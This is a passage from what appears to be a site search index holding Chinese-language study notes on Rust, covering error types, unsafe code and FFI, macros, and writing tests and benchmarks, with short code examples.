? \u7684\u65f6\u5019\u652f\u6301\u81ea\u52a8\u5c06 io::Error \u8f6c\u6362\u6210 MyError</li> </ul> </li> </ul> </li> <li>\u5f52\u4e00\u5316\u9519\u8bef\u7c7b\u578b<ul> <li>\u4f8b\u5982\u5c06 std::env::VarError \u548c std::io::Error \u5f52\u4e00\u5316\u4e3a\u540c\u4e00\u79cd\u7c7b\u578b</li> <li>\u53ef\u4ee5\u4f7f\u7528\u7279\u5f81\u5bf9\u8c61</li> <li>\u53ef\u4ee5\u81ea\u5b9a\u4e49 enum \u9519\u8bef\u7c7b\u578b\uff0c\u4f46\u662f\u4ee3\u7801\u8f83\u590d\u6742</li> <li>\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305 thiserror \u6765\u7b80\u5316\u81ea\u5b9a\u4e49\u9519\u8bef\u7c7b\u578b\u96c6\u5408     <pre><code>#[derive(thiserror::Error, Debug)]\nenum MyError {\n    #[error(\"Environment variable not found\")]\n    EnvironmentVariableNotFound(#[from] std::env::VarError),\n    #[error(transparent)]\n    IOError(#[from] std::io::Error),\n}\n</code></pre></li> <li>\u53ef\u4ee5\u4f7f\u7528\u7b2c\u4e09\u65b9\u5305 anyhow \u4e2d\u7684 anyhow::Result&lt;T&gt;\uff0c\u4e0d\u5173\u5fc3\u9519\u8bef\u6d88\u606f</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#unsafe","title":"unsafe","text":"<p>unsafe \u4ee3\u7801\u5757\u6709\u4e94\u79cd\u80fd\u529b</p> <ul> <li>\u89e3\u5f15\u7528\u88f8\u6307\u9488</li> <li>\u8c03\u7528\u4e00\u4e2a unsafe \u6216\u5916\u90e8\u7684\u51fd\u6570</li> <li>\u8bbf\u95ee\u6216\u4fee\u6539\u4e00\u4e2a\u53ef\u53d8\u7684\u9759\u6001\u53d8\u91cf\uff08\u524d\u9762\u4ecb\u7ecd\u8fc7\u4e86\uff09</li> <li>\u5b9e\u73b0\u4e00\u4e2a unsafe trait</li> <li>\u8bbf\u95ee union \u4e2d\u7684\u5b57\u6bb5</li> </ul> <p>\u4f46 unsafe \u4ee3\u7801\u5757\u4ecd\u7136\u53d7 rust \u7684\u5b89\u5168\u652f\u6301\uff0c\u5b83\u5e76\u4e0d\u80fd\u7ed5\u8fc7 rust \u7684\u501f\u7528\u68c0\u67e5\uff0c\u4e5f\u4e0d\u80fd\u5173\u95ed\u4efb\u4f55 rust \u7684\u5b89\u5168\u68c0\u67e5</p>"},{"location":"cs/pl/rust/basic/#_66","title":"\u89e3\u5f15\u7528\u88f8\u6307\u9488","text":"<ul> <li>\u88f8\u6307\u9488<ul> <li>\u88f8\u6307\u9488\u4e0d\u9002\u7528 Rust \u7684\u501f\u7528\u89c4\u5219\uff0c\u540c\u65f6\u62e5\u6709\u4e00\u4e2a\u6570\u636e\u7684\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u6307\u9488</li> <li>\u88f8\u6307\u9488\u4e0d\u80fd\u4fdd\u8bc1\u6307\u5411\u5408\u6cd5\u7684\u5185\u5b58</li> <li>\u88f8\u6307\u9488\u53ef\u4ee5\u662f null</li> <li>\u88f8\u6307\u9488\u6ca1\u6709\u5b9e\u73b0\u4efb\u4f55\u81ea\u52a8\u7684\u56de\u6536\uff08drop\uff09</li> <li>\u88f8\u6307\u9488\u53ef\u4ee5\u4f7f\u7528\u52a0\u51cf\u6cd5\uff08\u5bf9\u5730\u5740\u64cd\u4f5c\uff09\uff0c\u4f46\u662f\u8fd9\u4e0d\u4f1a\u8003\u8651\u5355\u5143\u5927\u5c0f\uff0c\u5efa\u8bae\u5bf9\u88f8\u6307\u9488\u8c03\u7528 .add \u65b9\u6cd5\uff08\u4f1a\u81ea\u52a8\u4e58\u5355\u5143\u5927\u5c0f\uff09</li> </ul> </li> <li>\u521b\u5efa\u88f8\u6307\u9488<ul> <li>\u521b\u5efa\u88f8\u6307\u9488\u662f safe \u7684\uff0c\u4e0d\u9700\u8981\u5199\u5728 unsafe \u5757\u4e2d</li> <li>\u88f8\u6307\u9488\u6709\u4e24\u79cd\u5199\u6cd5\uff1a<code>*const T</code> \u548c <code>*mut T</code> \u5206\u522b\u8868\u793a T \u7c7b\u578b\u7684\u4e0d\u53ef\u53d8\u6307\u9488\u548c\u53ef\u53d8\u6307\u9488\uff08\u8fd9\u91cc\u7684 * \u4ec5\u4ec5\u662f\u8bb0\u53f7\uff0c\u4e0d\u8868\u793a\u89e3\u5f15\u7528\u7684\u542b\u4e49\uff09</li> <li>\u57fa\u4e8e\u5f15\u7528\u521b\u5efa\u88f8\u6307\u9488     <pre><code>let mut num = 5;\nlet r1 = &amp;num as *const i32;\nlet r2 = &amp;mut num as *mut i32;\n</code></pre></li> <li>\u57fa\u4e8e\u5185\u5b58\u5730\u5740\u521b\u5efa\u88f8\u6307\u9488     <pre><code>let address = 0x012345usize;\nlet r = address as *const i32;\n</code></pre><ul> <li>\u76f8\u5f53\u5371\u9669\uff0c\u4f46\u521b\u5efa\u8fd9\u6837\u7684\u88f8\u6307\u9488\u4ecd\u7136\u662f safe \u7684\uff0c\u53ea\u8981\u4e0d\u89e3\u5f15\u7528</li> </ul> </li> <li>\u57fa\u4e8e\u667a\u80fd\u6307\u9488\u521b\u5efa\u88f8\u6307\u9488     <pre><code>let a: Box&lt;i32&gt; = Box::new(1);\nlet b: *const i32 = &amp;*a;\nlet c: *const i32 = Box::into_raw(a)\n</code></pre></li> <li>\u8c03\u7528\u65b9\u6cd5\u521b\u5efa\u88f8\u6307\u9488<ul> <li>\u4f8b\u5982 String \u7684 .as_ptr() \u548c .as_mut_ptr() \u65b9\u6cd5</li> </ul> </li> </ul> </li> <li>\u89e3\u5f15\u7528\u88f8\u6307\u9488<ul> <li>\u5728 unsafe \u5757\u4e2d\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 * \u5bf9\u88f8\u6307\u9488\u8fdb\u884c\u89e3\u5f15\u7528</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#unsafe_1","title":"\u8c03\u7528 unsafe \u6216\u5916\u90e8\u51fd\u6570","text":""},{"location":"cs/pl/rust/basic/#unsafe_2","title":"unsafe \u51fd\u6570","text":"<ul> <li>\u4f7f\u7528 unsafe fn \u5b9a\u4e49</li> <li>\u4e0d\u80fd\u76f4\u63a5\u8c03\u7528\uff0c\u53ea\u80fd\u5728 unsafe \u5757\u4e2d\u8c03\u7528\uff0c\u5373\u8981\u786e\u4fdd\u8ba4\u8bc6\u5230\u4e86\u6b63\u5728\u8c03\u7528\u7684\u662f\u4e00\u4e2a\u4e0d\u5b89\u5168\u7684\u51fd\u6570</li> <li>\u5305\u542b unsafe \u5757\u7684\u51fd\u6570\u4e0d\u5fc5\u90fd\u6807\u8bb0\u4e3a unsafe \u51fd\u6570\uff0c\u56e0\u4e3a\u6709\u4e9b\u51fd\u6570\u867d\u7136\u7528\u4e86 unsafe\uff0c\u4f46\u64cd\u4f5c\u5b9e\u9645\u4e0a\u662f\u5b8c\u5168\u5b89\u5168\u7684\uff08\u7f16\u8bd1\u5668\u4fdd\u5b88\u8ba4\u4e3a\u5176\u4e0d\u5b89\u5168\uff09</li> </ul>"},{"location":"cs/pl/rust/basic/#ffi","title":"FFI","text":"<ul> <li>\u5373 Foreign Function Interface\uff0c\u7528\u6765\u548c\u5176\u4ed6\u8bed\u8a00\u8fdb\u884c\u4ea4\u4e92</li> <li>rust \u8c03\u7528 c<ul> <li>\u9700\u8981\u5728 rust \u4ee3\u7801\u4e2d\u5199\u660e\u8981\u8c03\u7528\u7684\u51fd\u6570\u7b7e\u540d</li> <li>\u8c03\u7528\u5fc5\u987b\u5728 unsafe \u5757\u4e2d\u8fdb\u884c</li> <li>\u4f8b\u5982\u8c03\u7528 C \u6807\u51c6\u5e93\u4e2d\u7684 abs \u51fd\u6570     <pre><code>extern \"C\" {\n    fn abs(input: i32) -&gt; i32;\n}\nfn main() {\n    unsafe { println!(\"abs(-1) = {}\", abs(-1)); }\n}\n</code></pre></li> </ul> </li> <li>c \u8c03\u7528 rust     <pre><code>#[no_mangle]\npub extern \"C\" fn call_from_c() {\n    println!(\"Call from C\");\n}\n</code></pre><ul> <li>\u4f7f\u7528 extern \u521b\u5efa\u4e00\u4e2a\u63a5\u53e3</li> <li><code>#[no_mangle]</code> \u544a\u8bc9\u7f16\u8bd1\u5668\u4e0d\u8981\u4fee\u9970\u51fd\u6570\u540d</li> </ul> </li> <li>\u5b9e\u7528\u5de5\u5177<ul> <li>\u81ea\u52a8\u751f\u6210 FFI \u63a5\u53e3<ul> <li>\u751f\u6210 rust \u8c03\u7528 c \u7684\u4ee3\u7801\uff1a rust-lang/rust-bindgen</li> <li>\u4ece rust \u4ee3\u7801\u751f\u6210 c bindings\uff1a eqrion/cbindgen</li> </ul> </li> <li>\u4e0e C++ \u4ee3\u7801\u4ea4\u4e92\uff08\u662f\u5b89\u5168\u7684\uff09\uff1a dtolnay/cxx</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#unsafe-trait","title":"\u5b9e\u73b0 unsafe trait","text":"<ul> <li>\u81f3\u5c11\u6709\u4e00\u4e2a\u65b9\u6cd5\u5305\u542b\u7f16\u8bd1\u5668\u65e0\u6cd5\u9a8c\u8bc1\u7684\u5185\u5bb9\u7684 trait \u4f1a\u88ab\u6807\u4e3a unsafe</li> <li>\u5b9a\u4e49\u4f7f\u7528 unsafe trait \u5b9a\u4e49</li> <li>\u5b9e\u73b0\u65b9\u6cd5\u4f7f\u7528 unsafe impl</li> </ul>"},{"location":"cs/pl/rust/basic/#union","title":"\u8bbf\u95ee union \u4e2d\u5b57\u6bb5","text":"<ul> <li>\u7c7b\u4f3c\u7ed3\u6784\u4f53\uff0c\u4f46\u6240\u6709\u5b57\u6bb5\u5171\u7528\u540c\u4e00\u4e2a\u5b58\u50a8\u7a7a\u95f4\uff0c\u5373\u5411\u4e00\u4e2a\u5b57\u6bb5\u4e2d\u5199\u5165\u503c\u56de\u8986\u76d6\u5176\u5b83\u5b57\u6bb5     <pre><code>#[repr(C)]\nunion MyUnion {\n    f1: u32,\n    f2: f32,\n}\n</code></pre></li> <li>\u8bbf\u95ee union \u5b57\u6bb5\u662f\u4e0d\u5b89\u5168\u7684\uff0c\u56e0\u4e3a rust \u65e0\u6cd5\u4fdd\u8bc1\u5f53\u524d\u5b58\u50a8\u5728 union \u5b9e\u4f8b\u4e2d\u7684\u6570\u636e\u7c7b\u578b\uff0c\u4f46\u5199\u5165\u662f\u5b89\u5168\u7684</li> </ul>"},{"location":"cs/pl/rust/basic/#macro","title":"macro \u5b8f\u7f16\u7a0b","text":""},{"location":"cs/pl/rust/basic/#_67","title":"\u58f0\u660e\u5f0f\u5b8f","text":"<ul> <li>\u4f7f\u7528 macro_rules! \u8fdb\u884c\u5b9a\u4e49\uff0c\u5339\u914d\u4ee3\u7801\u5e76\u751f\u6210\u4ee3\u7801     <pre><code>#[macro_export]\nmacro_rules! myvec {\n    ( $( $x:expr ),* ) =&gt; {\n        {\n            let mut tmp_vec = Vec::new();\n            $(\n                tmp_vec.push($x);\n            )*\n            tmp_vec\n        }\n    };\n}\n</code></pre><ul> <li>\u5b8f\u540d\u79f0\u4e0d\u5fc5\u52a0 !\uff0c\u4f46\u8c03\u7528\u65f6\u9700\u8981\u52a0</li> <li><code>#[macro_export]</code> \u7528\u4e8e\u5bfc\u51fa\u5b8f\uff0c\u8ba9\u5176\u5b83\u5305\u53ef\u4ee5\u5f15\u5165\u4f7f\u7528</li> <li>\u8fdb\u884c\u8f93\u5165\u4ee3\u7801\u7684\u6a21\u5f0f\u5339\u914d\uff0c\u4f7f\u7528 <code>( $( $x:expr ),* )</code> \u5339\u914d\u591a\u4e2a\u4ee5 , \u5206\u9694\u7684\u8868\u8fbe\u5f0f\uff0c\u6bcf\u4e2a\u8bb0\u4e3a $x \u4f9b\u540e\u9762\u4ee3\u7801\u4e2d\u4f7f\u7528\uff0c* \u4ee3\u8868\u524d\u9762\u7684\u6a21\u5f0f\u53ef\u4ee5\u51fa\u73b0\u4efb\u610f\u6b21\uff08\u5305\u62ec 0\uff09</li> <li>=&gt; \u540e\u9762\u662f\u8981\u751f\u6210\u7684\u76ee\u6807\u4ee3\u7801</li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>myvec![1, 2, 3]</code> \u521b\u5efa Vec\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>myvec!(...)</code> \u6216 <code>myvec!{...}</code>\uff0c\u8fd9\u4e09\u8005\u7b49\u4ef7</li> </ul> </li> <li>\u8be6\u7ec6\u7528\u6cd5 TODO\uff1ahttps://veykril.github.io/tlborm/</li> </ul>"},{"location":"cs/pl/rust/basic/#_68","title":"\u8fc7\u7a0b\u5b8f","text":"<ul> <li>\u8fc7\u7a0b\u5b8f\u7684\u5b9a\u4e49\u5fc5\u987b\u653e\u5165\u72ec\u7acb\u7684 lib crate \u4e2d</li> <li>\u81ea\u5b9a\u4e49 derive \u8fc7\u7a0b\u5b8f<ul> <li>\u5728\u5f53\u524d crate \u6839\u76ee\u5f55\u4e0b\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 lib crate \u7528\u4e8e\u7f16\u5199\u5b8f</li> <li>\u65b0\u7684 Cargo.toml \u4e2d\u9700\u8981\u6dfb\u52a0     <pre><code>[lib]\nproc-macro = true\n\n[dependencies]\nsyn = \"1.0\"\nquote = \"1.0\"\n</code></pre></li> <li>lib.rs     <pre><code>extern crate proc_macro;\n\nuse proc_macro::TokenStream;\nuse quote::quote;\nuse syn;\n\n#[proc_macro_derive(HelloMacro)]\npub fn hello_macro_derive(input: TokenStream) -&gt; TokenStream {\n    // \u57fa\u4e8e input \u6784\u5efa AST \u8bed\u6cd5\u6811\n    let ast = syn::parse(input).unwrap();\n\n    // \u6784\u5efa\u7279\u5f81\u5b9e\u73b0\u4ee3\u7801\n    impl_hello_macro(&amp;ast)\n}\n</code></pre></li> <li>impl_hello_macro \u51fd\u6570     <pre><code>fn impl_hello_macro(ast: &amp;syn::DeriveInput) -&gt; TokenStream {\n    let name = &amp;ast.ident;\n    let gen = quote! {\n        impl HelloMacro for #name {\n            fn hello_macro() {\n                println!(\"Hello, Macro! My name is {}!\", stringify!(#name));\n            }\n        }\n    };\n    gen.into()\n}\n</code></pre><ul> <li>\u8bfb\u53d6 ast\uff0c\u4f7f\u7528 quote \u751f\u6210\u4ee3\u7801\uff0c\u7136\u540e\u8c03\u7528 .into \u8f6c\u6362\u6210 TokenStream</li> </ul> </li> <li>\u5bfc\u5165\u8fd9\u4e2a crate \u4e4b\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 <code>#[derive(HelloMacro)]</code> \u751f\u6210\u4ee3\u7801\u81ea\u52a8\u5b9e\u73b0 HelloMacro \u4e86</li> </ul> </li> <li>\u7c7b\u5c5e\u6027\u5b8f\uff08attribute-like macros\uff09<ul> <li>\u4f8b\u5982\u4fee\u9970\u4e00\u4e2a\u51fd\u6570\uff1a     <pre><code>#[route(GET, \"/\")]\nfn index() { ... }\n</code></pre></li> <li>\u4e5f\u9700\u8981\u4e00\u4e2a\u72ec\u7acb\u7684 crate \u6765\u5b9a\u4e49\uff0c\u5b9a\u4e49\u51fd\u6570\uff1a     <pre><code>#[proc_macro_attribute]\npub fn route(attr: TokenStream, item: TokenStream) -&gt; TokenStream {\n    ...\n}\n</code></pre><ul> <li>attr \u662f\u5c5e\u6027\u5305\u542b\u7684\u5185\u5bb9\uff0c\u5982\u4e0a\u4f8b\u5b50\u4e2d\u7684 GET, \"/\"</li> <li>item \u662f\u6807\u6ce8\u7684\u9879\uff0c\u5982\u4e0a\u4f8b\u5b50\u4e2d\u7684 fn index() { ... } \u5373\u6574\u4e2a\u51fd\u6570\u4f53</li> </ul> </li> </ul> </li> <li>\u7c7b\u51fd\u6570\u5b8f<ul> <li>\u548c\u58f0\u660e\u5b8f\u7684\u4f7f\u7528\u65b9\u5f0f\u7c7b\u4f3c\uff0c\u4f46\u548c\u524d\u4e24\u79cd\u8fc7\u7a0b\u5b8f\u7684\u5b9a\u4e49\u65b9\u5f0f\u7c7b\u4f3c</li> <li>\u4f8b\u5982\u5982\u4e0b\u8c03\u7528\u89e3\u6790 SQL \u8bed\u53e5\uff1a     <pre><code>let sql = sql!(SELECT * FROM posts WHERE id=1);\n</code></pre><ul> <li>\u9700\u8981\u5bf9 SQL \u8bed\u53e5\u8fdb\u884c\u89e3\u6790\uff0cmacro_rules \u96be\u4ee5\u5b9e\u73b0</li> </ul> </li> <li>\u7c7b\u51fd\u6570\u5b8f\u5b9a\u4e49\u5f62\u5f0f\uff1a     <pre><code>#[proc_macro]\npub fn sql(input: TokenStream) -&gt; TokenStream {\n    ...\n}\n</code></pre></li> </ul> </li> <li>TODO<ul> <li>\u8fc7\u7a0b\u5b8f\uff1ahttps://github.com/dtolnay/proc-macro-workshop\u3001https://blog.turbo.fish/</li> <li>\u58f0\u660e\u5b8f\uff1ahttps://veykril.github.io/tlborm/\u3001https://zjp-cn.github.io/tlborm/</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_69","title":"\u6d4b\u8bd5","text":""},{"location":"cs/pl/rust/basic/#_70","title":"\u65ad\u8a00","text":"<ul> <li>assert_eq! \u5b8f\u7528\u4e8e\u5224\u65ad\u4e24\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u662f\u5426\u76f8\u7b49<ul> <li>\u4e0d\u76f8\u7b49\u5f53\u524d\u7ebf\u7a0b\u4f1a\u76f4\u63a5 panic</li> <li>\u53ef\u4ee5\u4ece\u7b2c\u4e09\u4e2a\u53c2\u6570\u5f00\u59cb\u8865\u5145\u683c\u5f0f\u5316\u8f93\u51fa\u989d\u5916\u4fe1\u606f     <pre><code>assert_eq!(a, b, \"\u989d\u5916\u4fe1\u606f\uff1aa = {}...\", a);\n</code></pre></li> </ul> </li> <li>assert_ne! \u5b8f\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u76f8\u7b49\u4f1a panic</li> <li>assert! \u5b8f\u7528\u4e8e\u5224\u65ad\u4f20\u5165\u7684\u5e03\u5c14\u8868\u8fbe\u5f0f\u662f\u5426\u4e3a true\uff0c\u4e3a false \u7684\u8bdd\u4f1a panic</li> <li>debug_assert_eq! debug_assert_ne! debug_assert! \u5b8f\u7528\u6cd5\u76f8\u540c\uff0c\u4f46\u662f\u53ea\u4f1a\u5728 Debug \u6a21\u5f0f\u4e0b\u8fd0\u884c\uff0c\u4f8b\u5982 cargo run --release \u5c31\u4e0d\u4f1a\u6267\u884c\u8fd9\u4e9b\u65ad\u8a00</li> </ul>"},{"location":"cs/pl/rust/basic/#_71","title":"\u7f16\u5199\u6d4b\u8bd5","text":"<ul> <li>rust \u53ea\u4f1a\u80fd lib crate \u8fdb\u884c\u6d4b\u8bd5\uff0c\u800c\u65e0\u6cd5\u5bf9 bin crate \u6d4b\u8bd5</li> <li>\u5355\u5143\u6d4b\u8bd5<ul> <li>\u5b9a\u4e49\u4e00\u4e2a mod \u5e76\u6807\u8bb0\u4e3a test\uff1a     <pre><code>#[cfg(test)]\nmod tests {\n    #[test]\n    fn test1() {\n        assert_eq!(2 + 2, 4);\n    }\n}\n</code></pre></li> <li>panic \u4e86\u5219\u4e0d\u901a\u8fc7</li> <li>\u5bf9\u4e8e\u6d4b\u8bd5\u51fd\u6570\u6dfb\u52a0\u4e00\u4e2a <code>#[should_panic]</code> \u53ef\u4ee5\u6807\u8bb0 panic \u4e3a\u671f\u671b\u7ed3\u679c\uff0c\u4e0d panic \u5219\u4e0d\u901a\u8fc7<ul> <li>\u53ef\u4ee5\u4f7f\u7528 expected \u53c2\u6570\u6765\u8868\u793a\u671f\u671b\u5f97\u5230\u7684 panic \u5b57\u7b26\u4e32     <pre><code>#[test]\n#[should_panic(expected=\"...\")]\nfn test2() {\n    ...\n}\n</code></pre></li> </ul> </li> <li>\u53ef\u4ee5\u4f7f\u7528 Result \u4f5c\u4e3a\u8fd4\u56de\u503c\uff0c\u8fd4\u56de Err \u5219\u4e0d\u901a\u8fc7\uff0c\u53ef\u4ee5\u8fd9\u6837\u6765\u5b9e\u73b0\u6d4b\u8bd5\u7684\u94fe\u5f0f\u8c03\u7528\uff0c\u4f46 <code>#[should_panic]</code> \u5728\u6b64\u65f6\u5c06\u4e0d\u53ef\u7528</li> <li>\u4f7f\u7528 <code>#[ignore]</code> \u6765\u5ffd\u7565\u5f53\u524d\u6d4b\u8bd5<ul> <li>cargo test \u65f6\u4f20\u5165 --ignored \u53ef\u4ee5\u6267\u884c\u5ffd\u7565\u7684\u6d4b\u8bd5</li> </ul> </li> </ul> </li> <li>\u96c6\u6210\u6d4b\u8bd5<ul> <li>tests \u76ee\u5f55\u7528\u6765\u4e13\u95e8\u5b58\u653e\u96c6\u6210\u6d4b\u8bd5\uff0ccargo \u4f1a\u4ece\u4e2d\u5bfb\u627e\u6d4b\u8bd5\u6587\u4ef6\uff0c\u5728\u6d4b\u8bd5\u65f6\u90fd\u4f1a\u8fd0\u884c</li> <li>\u6bcf\u4e2a\u6587\u4ef6\u5185\u90e8\u4e0d\u9700\u8981 <code>#[cfg(test)]</code> \u4ee5\u53ca\u4e0d\u9700\u8981\u521b\u5efa mod</li> <li>cargo test --test name \u6765\u4ec5\u6d4b\u8bd5 tests/name.rs \u6587\u4ef6</li> <li>tests \u76ee\u5f55\u4e0b\u7684\u5b50\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u4e0d\u4f1a\u88ab\u5f53\u4f5c\u72ec\u7acb\u7684\u5305\u4e5f\u4e0d\u4f1a\u6709\u6d4b\u8bd5\u8f93\u51fa\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b50\u76ee\u5f55\u521b\u5efa\u6a21\u5757\u6765\u5b58\u653e\u6d4b\u8bd5\u65f6\u4f1a\u4f7f\u7528\u4f46\u4e0d\u5e0c\u671b\u88ab\u6d4b\u8bd5\u7684\u4ee3\u7801</li> </ul> </li> <li>cargo test<ul> <li>cargo test \u6267\u884c\u6240\u6709\u6d4b\u8bd5<ul> <li>\u5355\u5143\u6d4b\u8bd5\u3001\u96c6\u6210\u6d4b\u8bd5\u3001\u6587\u6863\u6d4b\u8bd5</li> </ul> </li> <li>\u4f7f\u7528 -- \u9644\u52a0\u53c2\u6570<ul> <li>-- \u540e\u52a0 --test-threads=... \u6765\u6307\u5b9a\u8fdb\u884c\u6d4b\u8bd5\u7684\u7ebf\u7a0b\u6570</li> <li>-- \u540e\u52a0 --show-output \u6765\u8f93\u51fa\u6807\u51c6\u8f93\u51fa\u4e2d\u5185\u5bb9<ul> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6d4b\u8bd5\u65f6\u5982\u679c\u901a\u8fc7\u5219\u6807\u51c6\u8f93\u51fa\u7684\u5185\u5bb9\u4e0d\u4f1a\u663e\u793a\u51fa\u6765</li> </ul> </li> <li>-- \u540e\u52a0 --ignored \u6765\u4ec5\u8fd0\u884c\u5ffd\u7565\u7684\u6d4b\u8bd5</li> <li>-- \u540e\u52a0 --no-run \u4ec5\u7f16\u8bd1\u51fa\u6d4b\u8bd5\u4e8c\u8fdb\u5236\u6587\u4ef6\u800c\u4e0d\u8fd0\u884c</li> </ul> </li> <li>\u8fd0\u884c\u90e8\u5206\u6d4b\u8bd5<ul> <li>cargo test name \u6765\u8fd0\u884c\u51fd\u6570\u540d\u91cc\u5305\u542b name \u7684\u6d4b\u8bd5\u51fd\u6570<ul> <li>\u6a21\u5757\u540d\u4e5f\u5305\u542b\u5728\u5176\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f9d\u6b64\u5206\u6a21\u5757\u8fdb\u884c\u6d4b\u8bd5</li> </ul> </li> </ul> </li> <li>Cargo.toml \u4e2d\u52a0\u5165 [dev-dependencies] \u6307\u5b9a\u4ec5\u5728 test \u65f6\u4f1a\u7528\u5230\u7684\u4f9d\u8d56</li> <li>cargo test \u65f6\u4f1a\u751f\u6210\u53ef\u8fd0\u884c\u6d4b\u8bd5\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4fdd\u5b58\u5728 target/debug/deps/ \u4e2d</li> </ul> </li> <li>\u57fa\u51c6\u6d4b\u8bd5 benchmark<ul> <li>\u5b98\u65b9 benchmark<ul> <li>\u53ea\u80fd\u5728\u975e stable \u7248\u672c\u4e0b\u4f7f\u7528\uff0c\u9700\u8981\u5f15\u5165\u7279\u6027 <code>#![feature(test)]</code></li> <li>\u548c test \u4e00\u6837\u5199\u5728 <code>#[cfg(test)]</code> \u4e2d\uff0c\u4f46\u4e0d\u6807\u8bb0\u4e3a <code>#[test]</code> \u800c\u662f <code>#[bench]</code> <pre><code>#[bench]\nfn bench_test(b: &amp;mut Bencher) {\n    b.iter(|| ...);\n}\n</code></pre><ul> <li>\u521d\u59cb\u5316\u4ee3\u7801\u8981\u5199\u5728 iter \u4e4b\u5916\uff0c\u5426\u5219\u4f1a\u591a\u6b21\u5faa\u73af</li> </ul> </li> <li>cargo test \u4f1a\u6267\u884c benchmark \u90e8\u5206\u4f46\u4e0d\u4f1a\u6709\u6027\u80fd\u6d4b\u8bd5\u7684\u8f93\u51fa\u7ed3\u679c</li> <li>\u901a\u8fc7 cargo bench \u6765\u6267\u884c benchmark \u4ee3\u7801\uff0c\u6b64\u65f6\u975e bench \u7684 test \u4f1a\u88ab ignore</li> <li>LLVM \u4f1a\u5c06\u6ca1\u6709\u526f\u4f5c\u7528\u7684\u51fd\u6570\u76f4\u63a5\u4f18\u5316\u5220\u6389\uff0c\u53ef\u4ee5\u4f7f\u7528 test::black_box \u6765\u5305\u88f9\u9632\u6b62\u88ab\u4f18\u5316\uff0c\u5982     <pre><code>b.iter(|| {\n    test::black_box(func(test::black_box(arg)));\n})\n</code></pre></li> </ul> </li> <li>\u4f7f\u7528 criterion.rs\uff08\u63a8\u8350\uff09<ul> <li>\u53ef\u4ee5\u6709\u66f4\u591a\u7684\u5206\u6790\u4fe1\u606f</li> <li>\u5b98\u65b9\u6587\u6863\uff1ahttps://bheisler.github.io/criterion.rs/book/getting_started.html</li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/pl/rust/misc/","title":"Rust \u6742\u9879\u968f\u8bb0","text":"<p> \u7ea6 635 \u4e2a\u5b57  144 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f</p> <p>Abstract</p> <p>\u770b\u5404\u79cd\u6587\u6863\u3001\u6559\u7a0b\u8bb0\u5f55\u7684\u96f6\u6563\u77e5\u8bc6\u70b9</p>"},{"location":"cs/pl/rust/misc/#_1","title":"\u8bed\u6cd5/\u7528\u6cd5\u8865\u5145","text":"<ul> <li>std::mem::size_of_val(&amp;x) \u8fd4\u56de x \u5360\u7528\u7684\u7a7a\u95f4\uff08\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff09</li> <li>.to_string() \u65b9\u6cd5\u4f1a\u5229\u7528\u5f53\u524d\u7c7b\u578b\u4e0a Display trait \u7684 fmt \u8f93\u51fa\uff0c\u5c06\u5176\u8f6c\u4e3a String\uff08\u5b9e\u73b0\u4e86 Display \u5c31\u5b9e\u73b0\u4e86 ToString trait\uff09</li> <li>.parse() \u4f1a\u5c1d\u8bd5\u89e3\u6790\u5b57\u7b26\u4e32\u5230\u5176\u5b83\u7c7b\u578b\uff0c\u5982\u679c\u90a3\u4e2a\u7c7b\u578b\u5b9e\u73b0\u4e86 FromStr trait \u5219\u53ef\u4ee5\u6b63\u5e38\u8f6c\u6362\u8fd4\u56de Ok(...) \u5426\u5219\u8fd4\u56de Err(...)<ul> <li>\u5df2\u7ecf\u6807\u6ce8\u4e86\u7ed1\u5b9a\u53d8\u91cf\u7684\u7c7b\u578b\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528 .parse()</li> <li>\u4e0d\u80fd\u63a8\u6d4b\u7c7b\u578b\u7684\u9700\u8981\u901a\u8fc7 .parse::&lt;type&gt;() \u8fdb\u884c\u8c03\u7528</li> </ul> </li> <li>ref \u53ef\u4ee5\u7528\u6765\u521b\u5efa\u5f15\u7528<ul> <li>let ref a = 1; \u76f8\u5f53\u4e8e let a = &amp;1;</li> <li>match \u7684\u65f6\u5019\u53ef\u4ee5\u5728 pattern \u91cc\u901a\u8fc7 ref \u6765\u521b\u5efa\u5f15\u7528     <pre><code>let a = 1;\nmatch a {\n    ref b =&gt; ..., // b \u662f\u4e00\u4e2a\u5f15\u7528\n}\nmatch a {\n    ref mut b =&gt; ..., // b \u662f\u4e00\u4e2a\u53ef\u53d8\u5f15\u7528\n}\n</code></pre></li> </ul> </li> <li>\u8f93\u5165\u8f93\u51fa<ul> <li>\u5229\u7528 Read trait \u7684\u65b9\u6cd5\u8fdb\u884c\u8bfb\u5165\uff0cstd::stdin() \u5e26\u6709 Read trait\uff0c\u53ef\u4ee5\u5bf9\u5176\u8c03\u7528 read \u65b9\u6cd5</li> <li>\u4e5f\u53ef\u4ee5\u8c03\u7528 std::Stdin \u4e0a\u7684 read_line \u65b9\u6cd5     <pre><code>let mut line = String::new();\nlet len_bytes = std::io::stdin().read_line(&amp;mut line).unwrap();\n</code></pre></li> <li>\u8f93\u51fa\u9664\u4e86\u901a\u8fc7 print \u4e4b\u5916\u8fd8\u53ef\u4ee5\u5229\u7528 Write trait \u7684\u65b9\u6cd5\uff0c\u5bf9 std::stdout() \u8c03\u7528 .write \u65b9\u6cd5</li> <li>\u6587\u4ef6\u8f93\u5165\u8f93\u51fa\u901a\u8fc7 std::fs::File::open \u6253\u5f00\u540e\u540c\u6837\u4f7f\u7528 Read \u548c Write 